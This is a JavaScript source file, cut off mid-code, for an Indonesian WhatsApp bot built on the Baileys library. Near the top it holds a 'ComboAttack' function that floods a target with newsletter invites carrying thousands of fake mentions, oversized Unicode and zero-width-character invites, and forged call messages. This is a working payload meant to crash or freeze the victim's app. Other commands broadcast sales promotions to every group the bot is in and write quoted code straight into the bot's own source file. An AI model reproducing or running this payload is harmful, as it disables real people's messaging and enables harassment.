               
 const config = require("./Settings/config")
global.owner = config.owner || ["992928758541"]
global.ownername = config.ownername || "ibnuu"
global.botname = config.botname || "Nachia Ai"
global.botver = config.botver || "2.0.0"
global.idch = config.idch || "120363419666720399@newsletter"
global.newsletterName = config.newsletterName || "Nugget"
global.packname = config.packname || "uget"
global.author = config.author || "ribka punya uget"
global.mess = config.mess || {}
global.panel = config.panel || {}
const {
    downloadContentFromMessage,
    proto,
    generateWAMessage,
    getContentType,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    GroupSettingChange,
    jidDecode,
    WAGroupMetadata,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateMessageID,
    jidNormalizedUser,
    generateForwardMessageContent,
    WAGroupInviteMessageGroupMetadata,
    GroupMetadata,
    Headers,
    delay,
    WA_DEFAULT_EPHEMERAL,
    WADefault,
    getAggregateVotesInPollMessage,
    generateWAMessageContent,
    areJidsSameUser,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    makeWaconnet,
    makeInMemoryStore,
    MediaType,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    initInMemoryKeyStore,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WAMediaUpload,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    DisconnectReason,
    WAconnet,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    templateMessage,
    InteractiveMessage,
    Header
} = require("@whiskeysockets/baileys")

const fs = require('fs')
const util = require('util')
const axios = require('axios')
const crypto = require('crypto')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone')
const yts = require('yt-search')
const path = require('path')
const Jimp = require('jimp')

async function ComboAttack(sock, target) {
  try {
    const delay = (ms) => new Promise(res => setTimeout(res, ms));

    for (let i = 1; i <= 75; i++) {

      const Reoclint = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1800 },
          () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net")
      ];

      await sock.relayMessage(target, {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "1234567891234@newsletter",
            newsletterName: "ϟ-£Rîēdz. Ēksò4!x¿𖣂?",
            caption: "I Am Tired",
            inviteExpiration: Date.now() + 90000,
            contextInfo: {
              participant: target,
              remoteJid: "status@broadcast",
              mentionedJid: Reoclint,
              stanzaId: "123" + Date.now()
            }
          }
        }
      }, { messageId: "BLANK_" + i });

      console.log(`Loh Awas${i}`);
      await delay(350);
    }

    await sock.relayMessage(target, {
      message: {
        groupInviteMessage: {
          groupJid: "1975@g.us",
          inviteCode: "ꦽ".repeat(3000),
          inviteExpiration: Date.now() + 999999999,
          groupName: "\u200B" + "ꦾ".repeat(1500),
          caption: "R" + "ꦾ".repeat(800),
          body: { text: "Always Solo Only" + "ꦽ".repeat(2000) }
        }
      }
    });

    await sock.relayMessage(target, {
      message: {
        interactiveMessage: {
          body: { text: "\u200B".repeat(1000) + "Вы готовы?" },
          nativeFlowMessage: {
            buttons: [
              { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Продолжить", id: "NEXT" }) }
            ]
          }
        }
      }
    });

    await sock.relayMessage(target, {
      message: {
        callMessage: {
          callId: "CALL_" + Date.now(),
          callType: "video",
          label: "Входящий видеозвонок",
          status: "ONGOING"
        }
      }
    });

    await sock.sendNode({
      tag: "message",
      attrs: { to: target, id: sock.generateMessageTag() },
      content: [
        {
          tag: "call_log_message",
          attrs: {
            callId: "CALL_",
            callType: "video",
            status: "missed",
            label: "XxX" + "\u200B".repeat(4000)
          }
        },
        {
          tag: "group_invite_message",
          attrs: {
            jid: "1975@g.us",
            invite_code: "ARCABOUTYOU",
            group_name: "XxX | Message",
            caption: "ꦽꦽꦽꦽ".repeat(1500)
          }
        }
      ]
    });

    console.log(`Успех комбоатаки: ${target}`);

  } catch (err) {
    console.error("Ошибка комбоатаки:", err);
  }
}

module.exports = async (conn, m) => {
    try {
        const from = m.key.remoteJid
        var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

        const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./Library/lib/myfunc')

        const {
            CatBox,
            UploadFileUgu,
            fileIO,
            pomfCDN,
            webp2mp4File,
            webp2mp4,
        } = require("./Library/lib/uploader.js")

        const budy = (typeof m.text === 'string') ? m.text : ''
        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.'
        const isCmd = body.startsWith(prefix)
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
        const args = body.trim().split(/ +/).slice(1)
        const text = q = args.join(" ")
        const sender = m.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (m.key.participant || m.key.remoteJid)
        const botNumber = await conn.decodeJid(conn.user.id)
        const senderNumber = sender.split('@')[0]
        const ownerList = Array.isArray(global.owner) ? global.owner : (global.owner ? [global.owner] : [])
        const isCreator = (m && m.sender && [botNumber, ...ownerList].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false
        const pushname = m.pushName || `${senderNumber}`
        const isBot = botNumber.includes(senderNumber)
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const groupMetadata = m.isGroup ? await conn.groupMetadata(from).catch(e => { }) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false

        if (m.message) {
            console.log(
                chalk.rgb(255, 107, 107)('┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓') + '\n' +
                chalk.rgb(78, 205, 196)(`┃     ${chalk.rgb(255, 230, 109).bold('⚡ PANTAT KUDA ⚡')}     ┃`) + '\n' +
                chalk.rgb(255, 107, 107)('┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫') + '\n' +

                chalk.rgb(116, 185, 255)(`┃ 🕐 Waktu  : `) + chalk.rgb(255, 255, 255)(new Date().toLocaleString('id-ID')) + '\n' +
                chalk.rgb(116, 185, 255)(`┃ 📨 Pesan  : `) + chalk.rgb(255, 255, 255)(budy || m.mtype) + '\n' +
                chalk.rgb(255, 107, 107)('┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫') + '\n' +

                chalk.rgb(255, 159, 243)(`┃ 👤 Dari   : `) + chalk.rgb(85, 239, 196).bold(pushname) + '\n' +
                chalk.rgb(255, 159, 243)(`┃ 🆔 ID     : `) + chalk.rgb(255, 255, 255)(m.sender) + '\n' +
                chalk.rgb(255, 107, 107)('┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫') + '\n' +

                chalk.rgb(255, 118, 117)(`┃ 📍 Tujuan : `) + chalk.rgb(129, 236, 236).bold(m.isGroup ? '🏢 GROUP' : '👤 PRIVATE') + '\n' +
                chalk.rgb(255, 118, 117)(`┃ 🏷️ Nama   : `) + chalk.rgb(255, 255, 255)(m.isGroup ? pushname : 'Private Chat') + '\n' +
                chalk.rgb(255, 118, 117)(`┃ 🔗 ID     : `) + chalk.rgb(200, 200, 200)(from) + '\n' +

                chalk.rgb(255, 107, 107)('┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
            )
        }

        try {
            ppuser = await conn.profilePictureUrl(m.sender, 'image')
        } catch (err) {
            ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
        }
        ppnyauser = await getBuffer(ppuser)

        const reSize = async (buffer, ukur1, ukur2) => {
            try {
                const image = await Jimp.read(buffer);
                const resized = await image.resize(ukur1, ukur2);
                const bufferResult = await resized.getBufferAsync(Jimp.MIME_JPEG);
                return bufferResult;
            } catch (error) {
                return buffer;
            }
        }

        let fkethmb;
        try {
            fkethmb = await reSize(ppnyauser, 300, 300);
        } catch (error) {
            fkethmb = ppnyauser;
        }

        const resize = async (image, width, height) => {
            const read = await Jimp.read(image);
            const data = await read.resize(width, height).getBufferAsync(Jimp.MIME_JPEG);
            return data;
        }

        conn.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
            let type = await conn.getFile(path, true)
            let {
                res,
                data: file,
                filename: pathFile
            } = type
            if (res && res.status !== 200 || file.length <= 65536) {
                try {
                    throw {
                        json: JSON.parse(file.toString())
                    }
                } catch (e) {
                    if (e.json) throw e.json
                }
            }
            let opt = {
                filename
            }
            if (quoted) opt.quoted = quoted
            if (!type) options.asDocument = true
            let mtype = '',
                mimetype = type.mime,
                convert
            if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker'
            else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image'
            else if (/video/.test(type.mime)) mtype = 'video'
            else if (/audio/.test(type.mime)) (
                convert = await (ptt ? toPTT : toAudio)(file, type.ext),
                file = convert.data,
                pathFile = convert.filename,
                mtype = 'audio',
                mimetype = 'audio/ogg; codecs=opus'
            )
            else mtype = 'document'
            if (options.asDocument) mtype = 'document'

            delete options.asSticker
            delete options.asLocation
            delete options.asVideo
            delete options.asDocument
            delete options.asImage

            let message = {
                ...options,
                caption,
                ptt,
                [mtype]: {
                    url: pathFile
                },
                mimetype
            }
            let m
            try {
                m = await conn.sendMessage(jid, message, {
                    ...opt,
                    ...options
                })
            } catch (e) {
                m = null
            } finally {
                if (!m) m = await conn.sendMessage(jid, {
                    ...message,
                    [mtype]: file
                }, {
                    ...opt,
                    ...options
                })
                file = null
                return m
            }
        }

        const reply = async (teks) => {
            let fakeQuoted = {
                key: {
                    fromMe: false,
                    participant: '0@s.whatsapp.net',
                    remoteJid: 'status@broadcast'
                },
                message: {
                    productMessage: {
                        product: {
                            title: 'nina X Nugget',
                            description: 'Official Business Catalog',
                            currencyCode: 'IDR',
                            priceAmount1000: 999999999,
                            retailerId: 'uget',
                            productImageCount: 1
                        },
                        businessOwnerJid: '6280000000000@s.whatsapp.net'
                    }
                }
            }

            await conn.sendMessage(from, { text: teks }, { quoted: fakeQuoted })
        }

        const reply2 = (teks) => {
            conn.sendMessage(from, { text: teks }, { quoted: m })
        }

        const example = (teks) => {
            return `\n *Contoh Penggunaan :*\n Ketik *${prefix + command}* ${teks}\n`
        }

        function getFormattedDate() {
            var currentDate = new Date();
            var day = currentDate.getDate();
            var month = currentDate.getMonth() + 1;
            var year = currentDate.getFullYear();
            var hours = currentDate.getHours();
            var minutes = currentDate.getMinutes();
            var seconds = currentDate.getSeconds();
        }

        let d = new Date(new Date + 3600000)
        let locale = 'id'
        let week = d.toLocaleDateString(locale, { weekday: 'long' })
        let date = d.toLocaleDateString(locale, {
            day: 'numeric',
            month: 'long',
            year: 'numeric'
        })
        const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })

        function msToTime(duration) {
            var milliseconds = parseInt((duration % 1000) / 100),
                seconds = Math.floor((duration / 1000) % 60),
                minutes = Math.floor((duration / (1000 * 60)) % 60),
                hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

            hours = (hours < 10) ? "0" + hours : hours
            minutes = (minutes < 10) ? "0" + minutes : minutes
            seconds = (seconds < 10) ? "0" + seconds : seconds
            return hours + " jam " + minutes + " menit " + seconds + " detik"
        }

        function msToDate(ms) {
            temp = ms
            days = Math.floor(ms / (24 * 60 * 60 * 1000));
            daysms = ms % (24 * 60 * 60 * 1000);
            hours = Math.floor((daysms) / (60 * 60 * 1000));
            hoursms = ms % (60 * 60 * 1000);
            minutes = Math.floor((hoursms) / (60 * 1000));
            minutesms = ms % (60 * 1000);
            sec = Math.floor((minutesms) / (1000));
            return days + " Hari " + hours + " Jam " + minutes + " Menit";
        }

        const timee = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (timee < "23:59:00") {
            var waktuucapan = 'Selamat Malam 🌃'
        }
        if (timee < "19:00:00") {
            var waktuucapan = 'Selamat Petang 🌆'
        }
        if (timee < "18:00:00") {
            var waktuucapan = 'Selamat Sore 🌅'
        }
        if (timee < "15:00:00") {
            var waktuucapan = 'Selamat Siang 🏙'
        }
        if (timee < "10:00:00") {
            var waktuucapan = 'Selamat Pagi 🌄'
        }
        if (timee < "05:00:00") {
            var waktuucapan = 'Selamat Subuh 🌉'
        }
        if (timee < "03:00:00") {
            var waktuucapan = 'Tengah Malam 🌌'
        }

        switch (command) {
                       
case 'getpp': {
    try {
        await conn.sendMessage(m.chat, {
            react: { text: "💌", key: m.key }
        })
        
        let targets = []
        
        const rawMentions = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || m.mentionedJid || []
        
        if (rawMentions.length > 0) {
            targets.push(...rawMentions)
        }
        
        if (m.quoted && m.quoted.sender) {
            targets.push(m.quoted.sender)
        }
        
        if (targets.length === 0) {
            targets.push(m.sender)
        }
        
        targets = [...new Set(targets)]
        
        if (targets.length > 1) {
            await reply(`⏳ Memproses ${targets.length} foto profil...`)
        }
        
        for (const target of targets) {
            try {
                await new Promise(resolve => setTimeout(resolve, 1000))
                
                const pp = await conn.profilePictureUrl(target, 'image')
                
                await conn.sendMessage(m.chat, {
                    image: { url: pp }
                }, { quoted: m })
                
            } catch (err) {
                await reply(`❌ Gagal mengambil PP untuk @${target.split('@')[0]} (Mungkin kosong/di-private)`)
            }
        }
        
    } catch (e) {
        reply(e.message || 'error terluar')
    }
    break
}

case 'negara': {
    try {
        if (!text) {
            return m.reply(`*Contoh:*\n${prefix + command} Indonesia`);
        }

        await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

        const query = text.toLowerCase().trim();

        // Ambil daftar negara
        const listRes = await fetch('https://restcountries.com/v3.1/all?fields=name,cca2,cca3');
        if (!listRes.ok) return m.reply('🍂 *Gagal mengambil daftar negara.*');

        const listData = await listRes.json();

        const country = listData.find(v =>
            v?.name?.common?.toLowerCase() === query ||
            v?.name?.official?.toLowerCase() === query
        );

        if (!country) {
            return m.reply(`🍂 *Negara* "${text}" *tidak ditemukan.*`);
        }

        const code = country.cca2 || country.cca3;

        // Ambil detail negara
        const detailRes = await fetch(`https://restcountries.com/v3.1/alpha/${code}`);
        if (!detailRes.ok) return m.reply('🍂 *Gagal mengambil detail negara.*');

        const [detail] = await detailRes.json();

        const name = detail.name.common;
        const official = detail.name.official;
        const capital = detail.capital?.join(', ') || 'Tidak tersedia';
        const region = detail.region || 'Tidak diketahui';
        const subregion = detail.subregion || 'Tidak diketahui';
        const population = detail.population?.toLocaleString('id-ID') || 'Tidak diketahui';
        const area = detail.area ? `${detail.area.toLocaleString('id-ID')} km²` : 'Tidak diketahui';
        const currencies = detail.currencies
            ? Object.values(detail.currencies).map(v => `${v.name} (${v.symbol})`).join(', ')
            : 'Tidak tersedia';
        const languages = detail.languages
            ? Object.values(detail.languages).join(', ')
            : 'Tidak tersedia';
        const flagImg = detail.flags?.png;
        const flagDesc = detail.flags?.alt || 'Deskripsi bendera tidak tersedia';

        let caption = `🌍 *Rest Countries*\n\n`;
        caption += `🏳️ *Negara:* ${name}\n`;
        caption += `📜 *Nama Resmi:* ${official}\n`;
        caption += `🏙️ *Ibu Kota:* ${capital}\n`;
        caption += `🌎 *Region:* ${region} (${subregion})\n`;
        caption += `👥 *Populasi:* ${population}\n`;
        caption += `📐 *Luas Wilayah:* ${area}\n`;
        caption += `💰 *Mata Uang:* ${currencies}\n`;
        caption += `🗣️ *Bahasa:* ${languages}\n\n`;
        caption += `📝 *Deskripsi Bendera:*\n${flagDesc}`;

        if (flagImg) {
            await conn.sendMessage(
                m.chat,
                { image: { url: flagImg }, caption },
                { quoted: m }
            );
        } else {
            await m.reply(`${caption}\n\n🍂 *Gambar bendera tidak tersedia.*`);
        }

    } catch (e) {
        console.error(e);
        await m.reply('🍂 *Terjadi kesalahan saat memproses data negara.*');
    } finally {
        await conn.sendMessage(m.chat, { react: { text: '', key: m.key } });
    }
}
break

case "sendtesti": case "testi": {
if (!isCreator) return Reply(global.mess.owner)
if (!text) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses jpm testimoni ke dalam channel & ${res.length} grup`)
await conn.sendMessage(global.idSaluran, {image: await fs.readFileSync(rest), caption: teks})
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {
  footer: `© WhatsApp Bots - 2025`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }, 
                 {
                  title: 'Digitalocean',
                  id: '.buydo'
                }, 
                {
                  title: 'Jasa Jpm Pesan',
                  id: '.buyjasajpm'
                },
                {
                  title: 'Topup Saldo Ewallet',
                  id: '.topupsaldo'
                },
                {
                  title: 'Topup Diamonds',
                  id: '.topupdiamond'
                }, 
                {
                  title: 'Topup Pulsa',
                  id: '.isipulsa'
                }          
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `Testimoni berhasil dikirim ke dalam channel & ${count} grup`}, {quoted: m})
}
break

case "sendtesti": case "testi": {
if (!isCreator) return Reply(global.mess.owner)
if (!text) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses jpm testimoni ke dalam channel & ${res.length} grup`)
await conn.sendMessage(global.idSaluran, {image: await fs.readFileSync(rest), caption: teks})
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {
  footer: `© WhatsApp Bots - 2025`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }, 
                 {
                  title: 'Digitalocean',
                  id: '.buydo'
                }, 
                {
                  title: 'Jasa Jpm Pesan',
                  id: '.buyjasajpm'
                },
                {
                  title: 'Topup Saldo Ewallet',
                  id: '.topupsaldo'
                },
                {
                  title: 'Topup Diamonds',
                  id: '.topupdiamond'
                }, 
                {
                  title: 'Topup Pulsa',
                  id: '.isipulsa'
                }          
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `Testimoni berhasil dikirim ke dalam channel & ${count} grup`}, {quoted: m})
}
break
case 'addcase': {
    if (!isCreator) return reply(mess.OnlyOwner)

    if (!m.quoted || !m.quoted.text) return reply('Reply code yang mau ditambahkan sebagai case')

    const fs = require('fs')
    const path = require('path')
    const namaFile = './nachia.js'
    
    let caseBaru = m.quoted.text
    
    const commandMatch = caseBaru.match(/case\s+['"]([^'"]+)['"]:/)
    if (!commandMatch) return reply('Format case tidak valid. harus diawali dengan "case \'command\':"')
    
    const command = commandMatch[1]
    
    const allowedVars = ['conn', 'sock', 'm', 'jid', 'from', 'chat', 'remoteJid', 'key', 'reply', 'reply2', 'example', 'args', 'text', 'q', 'prefix', 'command', 'budy', 'isCreator', 'pushname', 'botNumber', 'sender', 'mess', 'global', 'console', 'require', 'fs', 'path', 'process', '__dirname', '__filename', 'module', 'exports', 'Promise', 'setTimeout', 'setInterval', 'clearTimeout', 'clearInterval', 'Buffer', 'JSON', 'Math', 'Date', 'String', 'Array', 'Object', 'Number', 'Boolean', 'RegExp', 'Error', 'Function', 'Symbol']
    
    const varRegex = /\b([a-zA-Z_$][0-9a-zA-Z_$]*)\.(sendMessage|sendFile|relayMessage|groupMetadata|groupParticipantsUpdate)\b/g
    
    let modifiedCode = caseBaru
    let anomaliVars = new Set()
    let varMatch
    
    while ((varMatch = varRegex.exec(caseBaru)) !== null) {
        const varName = varMatch[1]
        if (!allowedVars.includes(varName) && varName !== 'conn' && varName !== 'sock') {
            anomaliVars.add(varName)
        }
    }
    
    if (anomaliVars.size > 0) {
        let anomaliList = Array.from(anomaliVars).join(', ')
        modifiedCode = caseBaru
        for (let anomali of anomaliVars) {
            const regex = new RegExp(`\\b${anomali}\\.`, 'g')
            modifiedCode = modifiedCode.replace(regex, 'conn.')
        }
    }
    
    const lines = modifiedCode.split('\n')
    let inMainBlock = false
    let mainBlockIndent = 0
    
    for (let i = 0; i < lines.length; i++) {
        const line = lines[i]
        
        if (line.match(/case\s+['"][^'"]+['"]:/)) {
            inMainBlock = true
            mainBlockIndent = line.search(/\S/)
            continue
        }
        
        if (inMainBlock) {
            const currentIndent = line.search(/\S/)
            
            if (line.trim() === '' || currentIndent <= mainBlockIndent) {
                if (line.trim() === 'break;' || line.includes('break')) {
                    continue
                }
                inMainBlock = false
                continue
            }
        }
    }
    
    modifiedCode = lines.join('\n')

    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Error reading file:', err)
            return reply('Gagal membaca file.')
        }

        const posisiAwalCase = data.indexOf("case 'addcase':")

        if (posisiAwalCase !== -1) {
            const kodeBaruLengkap = data.slice(0, posisiAwalCase) + '\n' + modifiedCode + '\n' + data.slice(posisiAwalCase)
            
            fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    console.error('Error writing file:', err)
                    return reply('Gagal menulis ke file.')
                } else {
                    let pesan = `✅ Case *${command}* berhasil ditambahkan!`
                    if (anomaliVars.size > 0) {
                        let anomaliList = Array.from(anomaliVars).join(', ')
                        pesan += `\n⚠️ *Variabel anomali terdeteksi:* ${anomaliList}`
                        pesan += `\n🔧 Semua variabel anomali telah diubah bos ku`
                    }
                    reply(pesan)
                }
            })
        } else {
            reply('❌ Tidak dapat menemukan posisi penambahan case.')
        }
    })
    break
}
 case 'scrape': {
    if (!isCreator) return reply("kacau ye wkkwkak")
    
    const fs = require('fs')
    const path = require('path')
    
    const DIR = './database/scrape'
    
    if (!fs.existsSync(DIR)) {
        fs.mkdirSync(DIR, { recursive: true })
    }
    
    if (!text) {
        return reply(`format:
scrape -add namafile.js
scrape -list
scrape -del namafile.js
scrape -get 1
scrape -get namafile.js`)
    }
    
    const args = text.trim().split(/\s+/)
    const cmd = args[0]
    const name = args[1]
    
    try {
        if (cmd === '-list') {
            const files = fs.readdirSync(DIR).filter(v => v.endsWith('.js'))
            
            if (!files.length) {
                return reply('tidak ada file scrape')
            }
            
            const list = files.map((v,i)=>`${i+1}. ${v}`).join('\n')
            return reply(`daftar file:\n\n${list}`)
        }
        
        if (cmd === '-add') {
            if (!name) return reply('masukan nama file')
            
            if (!m.quoted) {
                return reply('reply code yang mau disimpan')
            }
            
            const filePath = path.join(DIR, name)
            
            if (fs.existsSync(filePath)) {
                return reply('file sudah ada')
            }
            
            const code = m.quoted.text
            
            if (!code) {
                return reply('reply harus berisi text/code')
            }
            
            fs.writeFileSync(filePath, code)
            
            return reply(`berhasil simpan ${name}`)
        }
        
        if (cmd === '-del') {
            if (!name) return reply('masukan nama file')
            
            const filePath = path.join(DIR, name)
            
            if (!fs.existsSync(filePath)) {
                return reply('file tidak ditemukan')
            }
            
            fs.unlinkSync(filePath)
            return reply(`berhasil hapus ${name}`)
        }
        
        if (cmd === '-get') {
            if (!name) return reply('masukan nomor atau nama file')
            
            const files = fs.readdirSync(DIR).filter(v => v.endsWith('.js'))
            
            let fileName = name
            
            if (!isNaN(name)) {
                const index = parseInt(name) - 1
                if (!files[index]) {
                    return reply('nomor tidak valid')
                }
                fileName = files[index]
            }
            
            const filePath = path.join(DIR, fileName)
            
            if (!fs.existsSync(filePath)) {
                return reply('file tidak ditemukan')
            }
            
            const content = fs.readFileSync(filePath, 'utf8')
            
            await conn.sendMessage(m.chat, {
                document: Buffer.from(content),
                mimetype: 'text/javascript',
                fileName: fileName
            }, { quoted: m })
            
            return
        }
        
        return reply('command tidak dikenal')
        
    } catch (e) {
        return reply(String(e))
    }
    break
}    
case 'cpanel': {
    if (!isCreator) return reply("kacau ye wkkwkak")
    
    const fetch = require('node-fetch')
    const config = require('./Settings/config.js')
    
    const PANEL_CONFIG = {
        domain: config.panel.domain,
        apikey: config.panel.appKey,
        eggId: 15,
        nestId: 5,
        locationIds: [1],
        defaultNode: 1
    }
    
    const DOCKER_IMAGE = 'ghcr.io/parkervcp/yolks:nodejs_18'
    
    const generatePassword = (length = 10) => {
        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('')
    }
    
    const cleanUsername = (name) => {
        if (!name) return 'user' + Math.floor(Math.random() * 1000)
        return name.replace(/[^a-zA-Z0-9]/g, '').toLowerCase().slice(0, 10) || 'user' + Math.floor(Math.random() * 1000)
    }
    
    const formatError = (err) => {
        const msg = err.message || ''
        if (msg.includes('The username has already been taken')) return 'Username already taken.'
        if (msg.includes('The email has already been taken')) return 'Email already registered.'
        return `API Error: ${msg}`
    }
    
    async function pteroFetch(endpoint, method = 'GET', body = null) {
        const url = `${PANEL_CONFIG.domain}/api/application/${endpoint}`
        const options = {
            method,
            headers: {
                'Authorization': `Bearer ${PANEL_CONFIG.apikey}`,
                'Content-Type': 'application/json',
                'Accept': 'Application/vnd.pterodactyl.v1+json'
            }
        }
        if (body) options.body = JSON.stringify(body)
    
        const res = await fetch(url, options)
        const text = await res.text()
        
        if (!res.ok) {
            try {
                const jsonErr = JSON.parse(text)
                throw new Error(jsonErr.errors?.map(e => e.detail || e.code).join(', ') || 'Unknown Error')
            } catch (parseErr) {
                throw new Error(text.includes('nginx') ? `Server Error (${res.status})` : text)
            }
        }
        return JSON.parse(text)
    }
    
    async function createUser(username, email, password) {
        const data = await pteroFetch('users', 'POST', {
            username, email, password, first_name: username, last_name: "User", language: "en"
        })
        return data.attributes
    }
    
    let args = text?.trim().split(/\s+/) || []
    let usernameRaw = null
    let gb = null
    let isUnlimited = false
    
    if (args.length >= 1) {
        const lastArg = args[args.length - 1]
        if (lastArg.toLowerCase() === 'unli') {
            isUnlimited = true
            args.pop()
        } else if (!isNaN(lastArg)) {
            gb = parseInt(lastArg)
            args.pop()
        }
    }
    
    if (gb !== null) {
